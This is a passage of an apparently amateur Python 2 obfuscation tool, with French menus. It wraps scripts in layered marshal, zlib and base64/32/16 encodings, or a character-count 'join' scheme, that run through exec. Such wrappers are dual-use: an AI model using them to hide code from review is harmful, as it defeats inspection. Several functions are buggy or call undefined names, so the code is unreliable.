    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m4.\033[1;91m]\033[1;92m Mise a jour du script \033[1;97m   ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[48;5;0;38;5;192m Menu  General           \033[1;97m ‚ïë")
    print("\033[1;97m‚ïö"+30*"‚ïê"+1*"‚ïê‚ïù")   
    print("\033[1;97m‚ïë")
    choix_mars_zlib_base() 
def choix_mars_zlib_base():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print("\n\t\033[1;91m[\033[1;93m!\033[1;91m]\033[1;95m Remplissez correctement ")
	menu_mars_zlib_base()
    elif dmd =="1":
        menu_zlib_plus_base()
    elif dmd =="2":
        menu_mars_plus_bases()
    elif dmd =="3":
        menu_mars_plus_zlib_plus_base()
    elif dmd =="4":
        Maj()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
	raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_mars_zlib_base()
####################################################################################################
####################################################################################################
def menu_zlib_plus_base():
     cls()
     print(logo_zlib_base)
     horaire()
     print("\033[1;97m‚ïî"+30*"‚ïê"+1*"‚ïê‚ïó")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;136m Zlib   Uniquement     \033[1;97m   ‚ïë")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;111m Zlib + Base64         \033[1;97m   ‚ïë")  
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;125m Zlib + Base32         \033[1;97m   ‚ïë")  
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;113m Zlib + Base16         \033[1;97m   ‚ïë") 
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96mP.\033[1;91m]\033[38;5;247m Menu   Precedent      \033[1;97m   ‚ïë")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;112m Menu   General        \033[1;97m   ‚ïë") 
     print("\033[1;97m‚ïö"+30*"‚ïê"+1*"‚ïê‚ïù")   
     print("\033[1;97m‚ïë")
     choix_zlib_plus_base()
def choix_zlib_plus_base():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print("\n\t\033[1;91m[\033[1;93m!\033[1;91m]\033[1;95m Remplissez correctement ")
	menu_zlib_plus_base()
    elif dmd =="1":
        zlib_compresse()
    elif dmd =="2":
        zlib_base_64()
    elif dmd =="3":
        zlib_base_32()
    elif dmd =="4":
        zlib_base_16() 
    elif dmd =="p" or dmd =="P":
        menu_mars_zlib_base()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_zlib_plus_base()
####################################################################################################			
def zlib_compresse():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_zlib_plus_base()
	print("\033[1;97m‚ïë")
	resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compresse = zlib.compress(lecture)
		enregistrement = open(resultat,'w')
                enregistrement.write('#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib\nexec(zlib.decompress(' + repr(compresse) + '))')
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_zlib_plus_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_zlib_plus_base()
####################################################################################################
def zlib_base_64():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_zlib_plus_base()
	print("\033[1;97m‚ïë")
	resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compresse = base64.b64encode(zlib.compress(lecture))
		enregistrement = open(resultat,'w')
                enregistrement.write("'#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib , marshal , base64\nfrom base64 import *\nexec(zlib.decompress(base64.b64decode('''"+ repr(compresse) +"''')))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_zlib_plus_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_zlib_plus_base()
####################################################################################################
def zlib_base_32():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_zlib_plus_base()
	print("\033[1;97m‚ïë")
	resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compresse = base64.b32encode(zlib.compress(lecture))
		enregistrement = open(resultat,'w')
                enregistrement.write("#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib , marshal , base64\nfrom base64 import *\nexec(zlib.decompress(base64.b32decode('" + repr(compresse) + "')))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_zlib_plus_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_zlib_plus_base()
####################################################################################################v		
def zlib_base_16():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_zlib_plus_base()
	print("\033[1;97m‚ïë")
	resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compresse = base64.b16encode(zlib.compress(lecture))
		enregistrement = open(resultat,'w')
                enregistrement.write('#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib , marshal , base64\nfrom base64 import *\nexec(zlib.decompress(base64.b16decode(' + repr(compresse) + ')))')
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_zlib_plus_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_zlib_plus_base()
####################################################################################################
def Maj():
    cls()	     
    h = raw_input("\033[1;91m[\033[1;93m?\033[1;91m] \033[1;97mVoulez-vous effectuer une mise a jour du script ? \033[1;94m[\033[1;92mo/\033[1;91mn\033[1;94m]\033[1;91m : \033[1;97m ")
    if h =="n" or h =="N":
         menu_zlib_plus_base()
    elif h =="o" or h =="O":
	 cls()
	 load("\033[1;97mChargement\033[1;93m...")
	 cls()
         os.system('git pull origin master')
	 raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
	 os.system("cd $HOME/compiler && python2 compile ")
    else:
         print('\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + h + ' \x1b[1;91mindisponible')
         raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu')
         menu_zlib_plus_base()
####################################################################################################
####################################################################################################
def menu_mars_plus_bases():
     cls()
     print(logo_mars_base)
     horaire()
     print("\033[1;97m‚ïî"+30*"‚ïê"+1*"‚ïê‚ïó")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;111m Marshal Uniquement    \033[1;97m   ‚ïë")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;136m Marshall  + Base64    \033[1;97m   ‚ïë")  
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;125m Marshall  + Base32    \033[1;97m   ‚ïë")  
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;113m Marshall  + Base16    \033[1;97m   ‚ïë")    
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96mP.\033[1;91m]\033[38;5;115m Menu Precedent        \033[1;97m   ‚ïë") 
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;112m Menu General          \033[1;97m   ‚ïë") 
     print("\033[1;97m‚ïö"+30*"‚ïê"+1*"‚ïê‚ïù")   
     print("\033[1;97m‚ïë")
     choix_mars_plus_bases()
def choix_mars_plus_bases():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_mars_plus_bases()
    elif dmd =="1":
        marshall()
    elif dmd =="2":
        mars_base64()
    elif dmd =="3":
        mars_base32()
    elif dmd =="4":
        mars_base16()
    elif dmd =="p" or dmd =="P":
        menu_mars_zlib_base()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_mars_plus_bases()
####################################################################################################
def marshall():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		ouverture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_mars_zlib_base()
	print("\033[1;97m‚ïë")
	emplacement = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		depot = ouverture.replace('\r\n', '\n')
	        depot = depot.replace('\r', 'n')
	        if depot and depot[(-1)] != '\n':
	            depot = depot + '\n'
	        compilage = pp.compile(depot, '<r>', 'exec')
	        vidage = marshal.dumps(compilage)
		enregistrement = open(emplacement,"w")
		enregistrement.write("#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal\nexec(marshal.loads("+repr(vidage)+"))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_mars_zlib_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;97m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_mars_zlib_base() 
####################################################################################################
def mars_base64():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		ouverture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		mars_zlib_base()
	print("\033[1;97m‚ïë")
	emplacement = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compresse = base64.b64encode(mc.dumps(compile(ouverture, '<string>', 'exec')))
		enregistrement = open(emplacement,'w')
		enregistrement.write("#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , base64\nexec(marshal.loads(base64.b64decode('''"+compresse+"''')))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		mars_zlib_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                mars_zlib_base()		
####################################################################################################
def mars_base32():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		ouverture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_zlib_mars()
	print("\033[1;97m‚ïë")
	emplacement = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compresse = base64.b32encode(mc.dumps(compile(ouverture, '<string>', 'exec')))
		enregistrement = open(emplacement,'w')
		enregistrement.write("#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , base64\nexec(marshal.loads(base64.b32decode('"+compresse+"')))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_zlib_mars()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_zlib_mars()
####################################################################################################		
def mars_base16():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		ouverture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_zlib_mars()
	print("\033[1;97m‚ïë")
	emplacement = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compresse = base64.b16encode(mc.dumps(compile(ouverture, '<string>', 'exec')))
		enregistrement = open(emplacement,'w')
		enregistrement.write('#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , base64\nexec(marshal.loads(base64.b16decode("'+compresse+'")))')
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_zlib_mars()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_zlib_mars()   
####################################################################################################
####################################################################################################
def menu_mars_plus_zlib_plus_base():
     cls()
     print(logo7)
     horaire()
     print("\033[1;97m‚ïî"+30*"‚ïê"+1*"‚ïê‚ïó")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;111m Mars + Zlib + Base64    \033[1;97m ‚ïë")  
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;125m Mars + Zlib + Base32    \033[1;97m ‚ïë")  
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;113m Mars + Zlib + Base16    \033[1;97m ‚ïë") 
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96mP.\033[1;91m]\033[38;5;247m Menu   Precedent        \033[1;97m ‚ïë")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;112m Menu   General          \033[1;97m ‚ïë") 
     print("\033[1;97m‚ïö"+30*"‚ïê"+1*"‚ïê‚ïù")   
     print("\033[1;97m‚ïë")
     choix_mars_plus_zlib_plus_base()
def choix_mars_plus_zlib_plus_base():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print("\n\t\033[1;91m[\033[1;93m!\033[1;91m]\033[1;95m Remplissez correctement ")
	menu_mars_plus_zlib_plus_base()
    elif dmd =="1":
        mars_zlib_base_64()
    elif dmd =="2":
        mars_zlib_base_32()
    elif dmd =="3":
        mars_zlib_base_16()
    elif dmd =="p" or dmd =="P":
        menu_zlib_plus_base()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_mars_plus_zlib_plus_base()
####################################################################################################
def mars_zlib_base_64():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_mars_zlib_basemenu_mars_zlib_base()
	print("\033[1;97m‚ïë")
	resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compression = mc.dumps(compile(lecture, '<string>', 'exec'))
		compresse = base64.b64encode(zlib.compress(compression))
		enregistrement = open(resultat,'w')
                enregistrement.write("#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib, base64,marshal\nexec(marshal.loads(zlib.decompress(base64.b64decode('''"+ repr(compresse) +"'''))))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_mars_zlib_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_mars_zlib_base()
####################################################################################################
def mars_zlib_base_32():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_mars_zlib_base()
	print("\033[1;97m‚ïë")
	resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compression = mc.dumps(compile(lecture, '<string>', 'exec'))
		compresse = base64.b32encode(zlib.compress(compression))
		enregistrement = open(resultat,'w')
                enregistrement.write("#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib, base64,marshal\nexec(marshal.loads(zlib.decompress(base64.b32decode('" + repr(compresse) + "'))))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_mars_zlib_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_mars_zlib_base()
####################################################################################################
def mars_zlib_base_16():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_mars_zlib_base()
	print("\033[1;97m‚ïë")
	resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compression = mc.dumps(compile(lecture, '<string>', 'exec'))
		compresse = base64.b16encode(zlib.compress(compression))
		enregistrement = open(resultat,'w')
                enregistrement.write('#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib, base64,marshal\nexec(marshal.loads(zlib.decompress(base64.b16decode(' + repr(compresse) + '))))')
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_mars_zlib_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_mars_zlib_base()
#################################################################################################### 
####################################################################################################
def menu_Faxel_cryptage():
     cls()
     print(logo6)
     horaire()
     print("\033[1;97m‚ïî"+30*"‚ïê"+1*"‚ïê‚ïó")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;241m Cryptage Join      \033[1;92m‚àö  \033[1;97m   ‚ïë")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;125m Cryptage Bin Base Join\033[1;97m   ‚ïë") 
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;136m Menu encodage HEX  \033[1;92m‚àö  \033[1;97m   ‚ïë")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;112m Menu general          \033[1;97m   ‚ïë") 
     print("\033[1;97m‚ïö"+30*"‚ïê"+1*"‚ïê‚ïù")   
     print("\033[1;97m‚ïë")
     choix_Faxel_cryptage()
def choix_Faxel_cryptage():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_Faxel_cryptage()
    elif dmd =="1":
        Cryptage_join()
    elif dmd =="2":
        Cryptage_Bin_Base_Join() 
    elif dmd =="3":
        Menu_Hex() 
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_Faxel_cryptage()
####################################################################################################
def Cryptage_join():
   cls()  
   charge()
   cls()
   print(logo6)
   script_Join = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
   print("\033[1;97m‚ïë")
   resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")        
   ouverture = open(script_Join).read()
   mael = []
   faxel = []
   for x in ouverture:
       mael.append(ord(x))
   for a in mael:
       faxel.append('f' * a)
   compression = '#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , binascii, base64 , sys\nd={}\n\nexec("".join([chr(len(i)) for i in d]))'.format(faxel)
   enregistrement = open(resultat, 'w')
   enregistrement.write("#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , binascii, base64 , sys\n"+ compression)
   enregistrement.close()
   print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
   raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
   menu_Faxel_cryptage() 
####################################################################################################
def Cryptage_Bin_Base_Join():
	    cls()  
            charge()
            cls()
            print(logo6)
	    script_Hex = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	    print("\033[1;97m‚ïë")
            resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m") 
            ouverture_1 = open(script_Hex).read()  
            encode_base_32 = base64.b32encode(ouverture_1)
            a = []
            b = []
            c = []
            d = ''
            e = ''
            for x in encode_base_32:
                a.append(ord(x))
            z = 0
            while True:
                if z >= len(a) / 2:
                    break
                z += 1
            v = len(a) / 2 + 1
            try:
                while True:
                    v += 1
            except IndexError:
                pass
            for s in c:
                d += chr(s)
            e += bin(int(binascii.hexlify(d), 16))
            sauve_1 = open(resultat, 'w')
